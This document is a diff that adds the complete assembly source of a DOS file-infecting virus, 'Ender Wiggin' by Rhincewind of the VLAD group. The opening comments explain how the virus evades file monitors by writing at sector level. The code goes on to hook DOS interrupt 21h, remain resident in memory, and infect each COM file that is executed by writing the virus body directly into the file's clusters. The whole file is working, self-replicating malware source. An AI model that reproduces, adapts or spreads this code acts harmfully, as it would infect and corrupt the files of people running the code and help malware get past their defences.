@@ -1,0 +1,243 @@
+; Ender Wiggin, a cluster-thingy by Rhincewind [Vlad]
+;
+; This virus infects COM files using sector reads and writes, but not using
+; it's own file engine. Target files are opened using DOS. After that
+; the SFT's are queried which contain all the cluster numbers relevant
+; to infecting the file, being the first and last cluster. To get the last
+; cluster number you must read from that cluster which will enter the number
+; into the SFT's current cluster field. Infection is very straightforward
+; otherwise. This hybrid file/sector-level infection evades most of the
+; active file monitors, and thus a destructive stealth virus of this type
+; is a possible threat especially since directory stealthing can now be
+; done without risk or additional checks. Luckily, the larger the virus
+; gets, the fewer files it will be able to infect.
+; Setting the file's date/time to what it was in the first place forces a 
+; directory entry rewrite which is vital to the infection.
+
+                .model tiny
+                .code
+                .286
+                org 100h
+parasize        equ (endmem-start)
+start:          push 100h
+                mov ax, 3521h
+                int 21h
+                call next
+next:           pop bp
+                cmp ax, 2135h
+                jz exit_loader
+                mov [bp+(int21offset-next)],bx
+                mov [bp+(int21seg-next)],es
+                mov ah, 30h
+                int 21h
+                cmp al,4
+                jb exit_loader
+                push cs
+                pop es
+                mov ah, 4ah
+                mov bx,-1
+                push ax
+                int 21h
+                pop ax
+                sub bx, parasize+2
+                int 21h
+                xor di,di
+nextpsp:        cmp bx, word ptr ds:[di+16h]
+                mov bx, word ptr ds:[di+16h]
+                mov ds,bx
+                jnz nextpsp
+found_cmd:      mov ah, 50h
+                int 21h
+                mov ah, 48h
+                mov bx,parasize+1
+                int 21h
+                sub ax,10h
+                mov es,ax
+                mov ah, 50h
+                mov bx,cs
+                int 21h
+                push cs
+                pop ds
+                lea si, [bp-(next-start)]
+                mov di,100h
+                mov cx, endcopy-start
+                rep movsb
+                push es
+                pop ds
+                mov ax, 2521h
+                mov dx, offset int21
+                int 21h
+exit_loader:    push cs
+                push cs
+                pop es
+                pop ds
+                lea si, [bp+(three_bytes-next)]
+                mov di, 100h
+                movsw
+                movsb
+                xor ax,ax
+                xor bx,bx
+                mov cx,00ffh
+                cwd
+                mov bp,ds
+                xor si,si
+                mov di,sp
+                scasw
+                ret
+int21:          cmp ax, 3521h
+                jnz no_residency_check
+                pushf
+                call dword ptr cs:int21offset
+                xchg ah,al
+                iret
+no_residency_check:
+                cmp ax, 4b00h
+                jz infect_me_baby
+                db 0eah
+int21offset     dw ?
+int21seg        dw ?
+                db '-Ender Wiggin, by Rhince/VLAD-'
+infect_me_baby: push ds
+                push es
+                pusha                
+                mov ax, 3d00h
+                int 21h
+                jnc open_ok
+                jmp jmp_int21
+open_ok:        push ax
+                xchg ax,bx
+                mov ax, 440ah
+                int 21h
+                test dh,10000000b
+                jz local_handle
+                jmp close_exit
+local_handle:   push cs
+                pop es
+                mov ah,60h
+                mov si,dx
+                mov di, offset endcopy
+                int 21h
+                push word ptr es:[di]
+                push cs
+                pop ds
+                mov ax, 4202h
+                mov cx,-1
+                mov dx,cx
+                int 21h
+                mov ah,3fh
+                neg cx
+                mov dx, offset clust_read
+                int 21h
+                mov ax, 1220h
+                int 2fh
+                mov ax, 1216h
+                mov bl, byte ptr es:[di]
+                int 2fh
+                mov fill_cs,cs
+                pop dx
+                sub dl,'A'-1
+                mov ah, 32h
+                int 21h
+                mov ax, word ptr ds:[bx+0bh]
+                mov cs:data_sec,ax
+                mov cl, byte ptr ds:[bx+4]
+                inc cl
+                mov cs:sec_clust,cl
+                dec dl
+                mov bp,dx
+                mov ax, word ptr ds:[bx+02]
+                xor ch,ch
+                mul cx
+                cmp ax, 512*8
+                ja go_close_exit
+                cmp word ptr es:[di+13h],dx
+                jnz go_close_exit
+                xchg ax,bx
+                mov ax, word ptr es:[di+11h]
+                div bx
+                push dx
+                neg dx
+                add dx,bx                     
+                cmp dx, (endcopy-start)
+                jb go_close_exit
+                push cs
+                pop ds
+                mov ax, word ptr es:[di+0bh]
+                call calc_sec
+                int 25h
+                popf
+                pop dx
+                mov ax, word ptr ds:[bx+(clust_read-secdata)]
+                cmp ax, 'ZM'
+                jz go_close_exit
+                cmp ax, 'MZ'
+                jnz no_close_exit
+go_close_exit:  jmp close_exit
+no_close_exit:  mov word ptr ds:[bx+(three_bytes-secdata)],ax
+                mov ax, word ptr ds:[bx+(clust_read-secdata)+1]
+                mov byte ptr ds:[bx+(three_bytes-secdata)+2],ah
+                add ax, (endcopy-start)
+                mov cx, word ptr es:[di+11h]
+                sub cx,3
+                cmp ax,cx
+                jz go_close_exit
+                mov byte ptr ds:[bx+(clust_read-secdata)],0e9h
+                mov word ptr ds:[bx+(clust_read-secdata)+1],cx
+                push dx
+                call movez
+                int 26h
+                popf
+                mov ax, word ptr es:[di+35h]
+                call calc_sec
+                int 25h
+                popf
+                mov dx,bx
+                pop bx
+                add bx, offset clust_read
+                mov si, 100h
+                mov cx, (endcopy-start)
+copyloop:       lodsb
+                mov byte ptr ds:[bx],al
+                inc bx
+                loop copyloop
+                mov bx,dx
+                call movez
+                int 26h
+                popf
+                add word ptr es:[di+11h],(endcopy-start)
+                adc word ptr es:[di+13h],0
+close_exit:     pop bx
+                mov ax, 5700h
+                int 21h
+                mov ax, 5701h
+                int 21h
+                mov ah, 3eh
+                int 21h
+jmp_int21:      popa
+                pop es
+                pop ds
+                jmp dword ptr cs:int21offset
+calc_sec:       mov bx, offset secdata
+                dec ax
+                dec ax
+                mul word ptr ds:[sec_clust]
+                add ax, data_sec
+                adc dx, 0
+                mov word ptr ds:[bx],ax
+                mov word ptr ds:[bx+2],dx
+movez:          mov bx, offset secdata
+                xor cx,cx
+                dec cx
+                mov ax,bp
+                ret
+three_bytes     db 90h, 0cdh, 20h
+secdata         dd 0
+sec_clust       db 1                
+                db 0
+offzet          dw offset clust_read
+endcopy:
+fill_cs         dw ?    ;Doh I want relocation items.
+data_sec        dw ?
+clust_read:     db 512*8 dup (?)
+endmem:
+                end start
